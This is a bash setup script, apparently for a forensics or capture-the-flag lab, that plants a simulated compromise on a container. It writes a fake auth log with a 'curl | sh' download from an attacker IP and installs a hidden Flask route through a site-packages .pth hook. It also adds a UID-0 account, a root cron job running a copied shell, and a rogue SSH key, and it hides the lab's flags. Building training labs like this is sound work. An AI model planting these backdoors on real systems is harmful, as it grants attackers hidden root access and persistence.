#!/bin/bash
# 场景装料：业务源码拷入容器并启动；布置入侵痕迹、运行时隐藏路由、持久化后门、被篡改数据
set -e

# ---------- flag 落位（base64 藏置，模拟"赛方环境"） ----------
mkdir -p /root /opt/flags
printf %s 'ZmxhZ3tycl8yMDMuMC4xMTMuOTlfMDI0N30=' | base64 -d > /opt/flags/flag1   # flag{rr_203.0.113.99_0247}
printf %s 'ZmxhZ3tydW50aW1lX3JvdXRlX2luamVjdGlvbl9wdGh9' | base64 -d > /root/.flag2  # flag{runtime_route_injection_pth}
printf %s 'ZmxhZ3ticmVha2ZpeF9kb25lXzIwMjZ9' | base64 -d > /opt/flags/flag3_template # flag{breakfix_done_2026}
printf %s 'ZmxhZ3tkYXRhX3Jlc3RvcmVkfQ==' | base64 -d > /opt/flags/flag4_template     # flag{data_restored}
chmod 600 /opt/flags/* /root/.flag2

# ---------- 1) 入侵痕迹（flag1：溯源攻击源 IP 与时间） ----------
ATTACKER=203.0.113.99
touch /var/log/auth.log
cat >> /var/log/auth.log <<EOF
Mar 21 02:31:05 app-prod-03 sshd[881]: Failed password for ops from ${ATTACKER} port 44012 ssh2
Mar 21 02:31:09 app-prod-03 sshd[881]: Failed password for ops from ${ATTACKER} port 44018 ssh2
Mar 21 02:47:33 app-prod-03 sshd[917]: Accepted password for ops from ${ATTACKER} port 44090 ssh2
Mar 21 02:48:10 app-prod-03 sudo: ops : TTY=pts/0 ; COMMAND=/usr/bin/curl -fsSL http://${ATTACKER}:8000/x.sh | sh
EOF
mkdir -p /var/backups
cat > /var/backups/.attacker_note <<EOF
# 巡检备份遗留的陌生笔记（疑似攻击者落下）
ops 密码已在别处复用成功，入口稳了。
落地点 /tmp/.sysupdate，定时任务已挂。
EOF
cp /opt/flags/flag1 /var/backups/.attacker_note.flag
chmod 600 /var/backups/.attacker_note.*

# ---------- 2) 业务源码与数据 ----------
mkdir -p /opt/service /var/data/inbox
cp /opt/scene/app.py /opt/service/app.py

cat > /var/data/ledger.json <<'EOF'
{"accounts": {"ops": 1200, "deploy": 640, "audit": 90}, "tx_count": 42}
EOF
cat > /var/data/ledger.json.bak <<'EOF'
{"accounts": {"ops": 1200, "deploy": 640, "audit": 90}, "tx_count": 42}
EOF
sha256sum /var/data/ledger.json.bak | awk '{print $1}' > /var/data/.manifest
# 篡改：审计余额被改
cat > /var/data/ledger.json <<'EOF'
{"accounts": {"ops": 1200, "deploy": 640, "audit": 9990}, "tx_count": 42}
EOF

# ---------- 3) 运行时隐藏路由（内存马模拟：.pth 钩子，静态源码不可见） ----------
SP=$(python3 -c "import site; print(site.getsitepackages()[0])")
cat > "$SP/zzbackdoor.py" <<'EOF'
def _hook():
    try:
        from flask import Flask, request
        _orig = Flask.__init__
        def patched(self, *a, **k):
            _orig(self, *a, **k)
            @self.route("/_mnt/sync")
            def _sync():
                if request.args.get("k") == "m3m0ry":
                    return open("/root/.flag2").read()
                return "not found", 404
        Flask.__init__ = patched
    except Exception:
        pass
_hook()
EOF
echo "import zzbackdoor" > "$SP/zzz_mnt.pth"

# ---------- 4) 持久化后门（flag3 的 hygiene 前置条件） ----------
echo 'svcmon:x:0:0:monitor:/root:/bin/bash' >> /etc/passwd
mkdir -p /tmp/.sysupdate && cp /bin/dash /tmp/.sysupdate/.backup
cat > /etc/cron.d/system-backup <<'EOF'
*/5 * * * * root /tmp/.sysupdate/.backup >/dev/null 2>&1
EOF
mkdir -p /root/.ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHZ4H4gHb8Nc9bg0uJvXnMbkKeyPwn3rD3m0 backup@off" >> /root/.ssh/authorized_keys

# ---------- 5) 启动业务 ----------
cd /opt/service && nohup python3 app.py > /var/log/datapipe.log 2>&1 &
sleep 2
curl -s -m 3 -X POST http://127.0.0.1:9000/api/frame \
     -H 'Content-Type: application/json' -d '{"op":"ping"}' > /dev/null \
  && echo "[plant] service up & healthy" || echo "[plant] WARNING: service not responding"
echo "[plant] scene ready at $(date)"
